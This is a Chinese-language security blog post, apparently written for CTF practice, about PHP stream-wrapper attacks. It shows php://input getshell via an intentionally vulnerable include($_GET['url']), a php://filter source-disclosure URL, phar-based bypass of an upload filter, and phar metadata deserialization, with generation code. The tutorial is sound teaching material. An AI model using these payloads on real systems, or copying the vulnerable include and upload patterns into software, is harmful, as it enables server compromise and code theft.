<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  

  
  <title>php的协议漏洞 | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="1.php://input在php中，如果配置文件开启不当，则可能造成php://input来getshell 命令执行。 前提   1.在allow_url_include = On    2.PHP &amp;gt;= 5.2.0当然如果开启了远程文件包含则可以任意getshell。不过在一些攻防赛中，节约时间直接php://input则可能更快的得分留后门。 首先在php.ini 文件打开设置如上第">
<meta name="keywords" content="web漏洞">
<meta property="og:type" content="article">
<meta property="og:title" content="php的协议漏洞">
<meta property="og:url" content="http://yoursite.com/2018/12/25/php协议漏洞/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="1.php://input在php中，如果配置文件开启不当，则可能造成php://input来getshell 命令执行。 前提   1.在allow_url_include = On    2.PHP &amp;gt;= 5.2.0当然如果开启了远程文件包含则可以任意getshell。不过在一些攻防赛中，节约时间直接php://input则可能更快的得分留后门。 首先在php.ini 文件打开设置如上第">
<meta property="og:locale" content="en">
<meta property="og:image" content="https://i.imgur.com/fJkQE5i.png">
<meta property="og:image" content="https://i.imgur.com/dThe4OD.png">
<meta property="og:image" content="https://i.imgur.com/gYMXUZY.png">
<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181221211646-aada296c-0522-1.png">
<meta property="og:image" content="https://i.imgur.com/lL8VOBm.png">
<meta property="og:image" content="https://i.imgur.com/EMNiWST.png">
<meta property="og:image" content="https://images.seebug.org/content/images/2018/08/17c4c630-b5f7-4e02-af48-160cd8fcf73a.png-w331s">
<meta property="og:image" content="https://i.imgur.com/8f3zlTg.png">
<meta property="og:updated_time" content="2018-12-26T11:11:32.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="php的协议漏洞">
<meta name="twitter:description" content="1.php://input在php中，如果配置文件开启不当，则可能造成php://input来getshell 命令执行。 前提   1.在allow_url_include = On    2.PHP &amp;gt;= 5.2.0当然如果开启了远程文件包含则可以任意getshell。不过在一些攻防赛中，节约时间直接php://input则可能更快的得分留后门。 首先在php.ini 文件打开设置如上第">
<meta name="twitter:image" content="https://i.imgur.com/fJkQE5i.png">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-php协议漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/12/25/php协议漏洞/" class="article-date">
  <time datetime="2018-12-24T16:00:00.000Z" itemprop="datePublished">2018-12-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      php的协议漏洞
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="1-php-input"><a href="#1-php-input" class="headerlink" title="1.php://input"></a>1.php://input</h1><p>在php中，如果配置文件开启不当，则可能造成php://input来getshell 命令执行。</p>
<p>前提  </p>
<pre><code>1.在allow_url_include = On   
2.PHP &gt;= 5.2.0</code></pre><p>当然如果开启了远程文件包含则可以任意getshell。不过在一些攻防赛中，节约时间直接php://input则可能更快的得分留后门。</p>
<p>首先在php.ini 文件打开设置如上第一个条件。源码</p>
<pre><code>&lt;?php
include($_GET[&apos;url&apos;]);
?&gt;</code></pre><p>直接进行包含即可，<img src="https://i.imgur.com/fJkQE5i.png" alt></p>
<p>当然这种情况一般不可能出现在实战中，CTF中可能会用到，或者一些隐蔽后门。</p>
<h1 id="2-php-filter"><a href="#2-php-filter" class="headerlink" title="2.php://filter"></a>2.php://filter</h1><p>在一些CTF中，经常用到文件包含造成任意文件源码读取。同样漏洞源码</p>
<pre><code>&lt;?php
include($_GET[&apos;url&apos;]);
?&gt;</code></pre><p><a href="http://127.0.0.1/000.php?url=php://filter/read=convert.base64-encode/resource=./index.php" target="_blank" rel="noopener">http://127.0.0.1/000.php?url=php://filter/read=convert.base64-encode/resource=./index.php</a><br><img src="https://i.imgur.com/dThe4OD.png" alt></p>
<h1 id="3-phar"><a href="#3-phar" class="headerlink" title="3.phar://"></a>3.phar://</h1><h2 id="绕过上传getshell"><a href="#绕过上传getshell" class="headerlink" title="绕过上传getshell"></a>绕过上传getshell</h2><p>在一些过滤上传，只允许上传jpg文件的时候，可以通过phar://协议来绕过上传造成getshell。接下来实例，上传php的一段代码。</p>
<pre><code>&lt;?php
ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;);
if($_FILES[&quot;file&quot;][&quot;error&quot;]&gt;0)
{
    echo &quot;Error:&quot;.$FILES[&quot;file&quot;][&quot;error&quot;].&quot;&lt;br/&gt;&quot;;
}
else
{
    echo &quot;Upload name:&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;].&quot;&lt;br/&gt;&quot;;#被上传文件的名称
    echo &quot;Type:&quot;.$_FILES[&quot;file&quot;][&quot;type&quot;].&quot;&lt;br/&gt;&quot;;#上传文件的类型
    echo &quot;size:&quot;.($_FILES[&quot;file&quot;][&quot;size&quot;]/1024).&quot;kb&lt;br/&gt;&quot;;#上传文件的大小（kb）
echo &quot;Stored in:&quot;.$_FILES[&quot;file&quot;][&quot;tmp_name&quot;].&quot;&lt;br/&gt;&quot;;#存储在服务器的文件的临时副本的名称
}

$waf = explode(&quot;.&quot;, $_FILES[&apos;file&apos;][&apos;name&apos;]);
if(end($waf)==&quot;jpg&quot;)
{
if(file_exists(&quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]))
{
    echo $_FILES[&quot;file&quot;][&quot;name&quot;].&quot; already exists&quot;;
}
else
{
    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]);
    echo &quot;Stored in :&quot; .&quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;];
}
}
else{
echo &apos;&lt;script&gt;alert(&quot;不允许上传的类型&quot;)&lt;/script&gt;&apos;;
}
?&gt;
&lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
&lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;
&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;/&gt;
&lt;br/&gt;
&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot;/&gt; 
&lt;/form&gt;</code></pre><p>这段代码（粗略的写了一波，其他方式随便绕过）设置只允许jpg上传，但是在某些条件下我们可以通过文件包含来造成绕过上传配合包含getshell。</p>
<p>还是配合漏洞代码。</p>
<pre><code>&lt;?php
include($_GET[&apos;url&apos;]);
?&gt;</code></pre><p>我们先创建一个php文件，然后写马进去，然后解压，解压之后修改后缀名为jpg，然后再利用phar协议读取文件，通过包含造成getshell。</p>
<p><img src="https://i.imgur.com/gYMXUZY.png" alt></p>
<p>其实既然存在文件包含，并不需要phar读取，单纯jpg文件包含也会以php解析，但是这不失为一种猥琐思路，在一些ctf中还是经常能遇到的。</p>
<h2 id="phar造成的反序列化漏洞。"><a href="#phar造成的反序列化漏洞。" class="headerlink" title="phar造成的反序列化漏洞。"></a>phar造成的反序列化漏洞。</h2><p>环境apache+php5.4<br>php.ini中必须设置phar.readonly=Off，不然Phar文件就会无法生成。前面的分号注意去掉。</p>
<p>前言，在php中对一个文件压缩时候，部分信息会序列化，而配合 file_exists（ ），is_dir（）等文件解析文件时会进行反序列化，而造成反序列化漏洞。接下来我们详解。</p>
<p>1.a stub<br>可以理解为一个标志，格式为xxx<?php xxx; __HALT_COMPILER();?>，前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。</p>
<p>2.核心meta-data</p>
<p>phar文件本质上是压缩文件，我们通过phar协议来读取压缩文件。在压缩的时候，压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data。我们通过这部分序列化，来造成后面的攻击。</p>
<p>3.被压缩的文件<br>及内容并不重要，因为我们需要的是meta-data的反序列化。</p>
<p>4.a signature for verifying Phar integrity<br>签名格式</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181221211646-aada296c-0522-1.png" alt></p>
<p>先利用php代码生成phar文件。</p>
<pre><code>&lt;?php
    class Test{
        public $test=&quot;test&quot;;
    }
    @unlink(&quot;test.phar&quot;);
    $phar = new Phar(&quot;test.phar&quot;); //后缀名必须为phar
    $phar-&gt;startBuffering();
    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub
    $o = new Test();
    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest
    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件，内容无所谓。
    $phar-&gt;stopBuffering();    //签名自动计算
?&gt;</code></pre><p>执行php文件生成test.phar的文件。<img src="https://i.imgur.com/lL8VOBm.png" alt>，可以看到已经进行了序列化。</p>
<p>在使用Phar:// 协议流解析Phar文件时，Meta-data中的内容也会进行反序列化。</p>
<pre><code>&lt;?php
echo file_get_contents(&quot;phar://./test.phar/test.txt&quot;);
?&gt;</code></pre><p><img src="https://i.imgur.com/EMNiWST.png" alt><br>可以看到已经反序列化读到了phar文件里的test.txt</p>
<p>php的许多文件系统函数在phar://解析时都会反序列化。<br><img src="https://images.seebug.org/content/images/2018/08/17c4c630-b5f7-4e02-af48-160cd8fcf73a.png-w331s" alt></p>
<p>这里简单理解下，</p>
<pre><code>&lt;?php
    class TestObject {
    }
    @unlink(&quot;phar.phar&quot;);
    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar
    $phar-&gt;startBuffering();
    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub
    $o = new TestObject();
    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest
    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
    //签名自动计算
    $phar-&gt;stopBuffering();
?&gt;</code></pre><p>先生成phar.phar文件。然后测试php代码。</p>
<pre><code>&lt;?php
class TestObject {
        public function __destruct() {
            echo &apos;Destruct called&apos;;
        }
    }

     if(file_exists($_GET[&apos;file&apos;]))
         exit;
?&gt;</code></pre><p><img src="https://i.imgur.com/8f3zlTg.png" alt></p>
<p>可以看到输出了 Destruct called，成功执行了类TestObject。代码</p>
<pre><code>if(file_exists($_GET[&apos;file&apos;]))
    exit;</code></pre><p>相当于变成了 $o = new TestObject();</p>
<p>在file_exists时候反序列化，还原了传入的php代码。</p>
<p>参考swpu的一道CTF题目–&gt;&gt; SimplePHP <a href="https://www.anquanke.com/post/id/168338" target="_blank" rel="noopener">https://www.anquanke.com/post/id/168338</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/12/25/php协议漏洞/" data-id="ck0l0oh9i0010py2ihpth57uc" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web漏洞/">web漏洞</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2019/02/28/身份认证劫持/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          session，cookie认证会话安全问题
        
      </div>
    </a>
  
  
    <a href="/2018/12/21/第九届swpuctf/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">swpu第九届线上ctf</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web漏洞/">web漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/杂/">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透攻防/">渗透攻防</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/python/" style="font-size: 14px;">python</a> <a href="/tags/web漏洞/" style="font-size: 18px;">web漏洞</a> <a href="/tags/杂/" style="font-size: 16px;">杂</a> <a href="/tags/渗透攻防/" style="font-size: 12px;">渗透攻防</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2019/06/25/csp内容安全策略/">csp内容安全策略</a>
          </li>
        
          <li>
            <a href="/2019/05/25/thinkphp3.2.3/">thinkphp框架学习</a>
          </li>
        
          <li>
            <a href="/2019/05/17/url跳转实战/">渗透之url跳转</a>
          </li>
        
          <li>
            <a href="/2019/04/20/反序列化学习/">PHP反序列化学习</a>
          </li>
        
          <li>
            <a href="/2019/04/14/2019DDCTF/">2019DDCTF</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2019 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>